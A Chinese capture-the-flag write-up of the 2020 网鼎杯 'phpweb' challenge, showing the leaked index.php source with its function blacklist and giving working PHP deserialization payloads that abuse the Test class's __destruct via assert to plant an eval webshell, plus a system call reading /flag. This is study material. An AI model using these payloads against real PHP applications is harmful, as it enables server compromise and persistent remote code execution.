# 网鼎杯 2020 朱雀组【phpweb】
进去看到报错
![[file-20251219163414701.png]]
看到这里是调用了`data()`函数，抓包看看
![[file-20251219163619250.png]]
应该就是`func`：函数名；`p`：参数
试着`file_get_contents`读一下`index.php`
得到源码：
```php
    <?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```
直接传参会有waf，注意到有个`__destruct`，这里也调用了`gettime`，并且没有waf；
![[file-20251219172323661.png]]
其实这里可以直接通过
`call_user_func("system","cat /flag");`这样getflag，但是这里m神让写马，上面这样能命令执行了，但是这不是一次性的吗，不太懂怎么连接的，试了文件写入，好像也没权限，本地试了一下，可以写文件，题目应该是限制了权限
```php
O:4:"Test":2:{s:1:"p";s:57:"file_put_contents('abc.php','<?=eval($_POST["cmd"]);?>');";s:4:"func";s:6:"assert";}
```
也可以像这样：
```php
<?php
class Test {
    var $p = "Y-m-d h:i:s a";
    var $func = "date";

}

$test = new Test();


$test->func="assert";
$test->p='eval($_POST["1"]);';


echo serialize($test);
```
但是这样只有一次呀，当时可以执行，这咋连接。。。
后面了解了一下，蚁剑可以直接设置发包的参数，直接连接就好了

# 